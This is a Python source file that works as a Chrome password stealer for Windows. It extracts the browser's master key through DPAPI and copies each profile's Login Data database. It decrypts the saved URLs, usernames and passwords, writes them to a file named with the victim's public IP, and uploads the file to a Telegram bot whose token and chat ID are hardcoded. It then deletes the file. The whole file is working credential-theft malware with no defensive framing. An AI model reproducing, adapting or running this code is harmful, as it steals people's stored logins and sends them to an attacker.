import base64
import json
import os
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import requests
import glob
import sys

TOKEN = "6636473811:AAGX8vFwIVPPYy4hohcQrT89RZ_Bjx_9BW0"
CHAT_ID = "6611079605"


class ChromePasswordDecryptor:
    def __init__(self):
        self.master_key = None

        self.content = []

    def run(self):
        try:
            self.get_master_key()
        except:
            self.backup_login_database()

            self.decrypt_passwords()

            try:
                self.write_content_to_file()
            except:
                pass
            self.send_file_to_telegram()

    def get_master_key(self):
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Local State",
        )

        with open(local_state_path, "r") as f:
            local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[
                5:
            ]

            self.master_key = win32crypt.CryptUnprotectData(
                encrypted_key, None, None, None, 0
            )[1]

    def backup_login_database(self):
        user_data_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
        )
        pattern = os.path.join(user_data_path, "Profile*")
        profile_dirs = glob.glob(pattern)
        for profile_dir in profile_dirs:
            login_data_path = os.path.join(profile_dir, "Login Data")

            shutil.copy2(login_data_path, "Login.db")

    def decrypt_passwords(self):
        connection = sqlite3.connect("Login.db")

        cursor = connection.cursor()

        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )

            for row in cursor.fetchall():
                url, username, encrypted_password = row

                try:
                    iv = encrypted_password[3:15]

                    data = encrypted_password[15:]

                    cipher = AES.new(self.master_key, AES.MODE_GCM, iv)

                    decrypted_password = cipher.decrypt(data)[:-16].decode()

                except Exception:
                    decrypted_password = ""

                if len(username) > 0:
                    content = {
                        "Website": url,
                        "Username": username,
                        "Password": decrypted_password,
                    }
                    self.content.append(content)

        except Exception:
            pass

        finally:
            cursor.close()
            connection.close()

            try:
                os.remove("Login.db")

            except Exception:
                pass

    @staticmethod
    def get_public_ip():
        response = requests.get("https://api.ipify.org?format=json")
        data = response.json()
        ip_address = data["ip"]
        return ip_address

    def write_content_to_file(self):
        ip_address = self.get_public_ip()

        file_path = f"password_{ip_address}.txt"

        with open(file_path, "w") as file:
            for content in self.content:
                file.write("Website: {}\n".format(content["Website"]))

                file.write("Username: {}\n".format(content["Username"]))

                file.write("Password: {}\n".format(content["Password"]))

                file.write("-" * 50 + "\n")

    def send_file_to_telegram(self):
        ip_address = self.get_public_ip()

        file_path = f"password_{ip_address}.txt"

        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

            files = {
                "document": open(
                    os.path.join(os.getcwd(), file_path), "rb"
                )
            }

            data = {"chat_id": CHAT_ID}

            requests.post(url, files=files, data=data)

        except Exception as ex:
            print(f"Error occurred while sending file: {ex}")


if __name__ == "__main__":
    decryptor = ChromePasswordDecryptor()
    decryptor.run()
    ip_address = decryptor.get_public_ip()
    file_path = f"password_{ip_address}.txt"
    os.remove(file_path)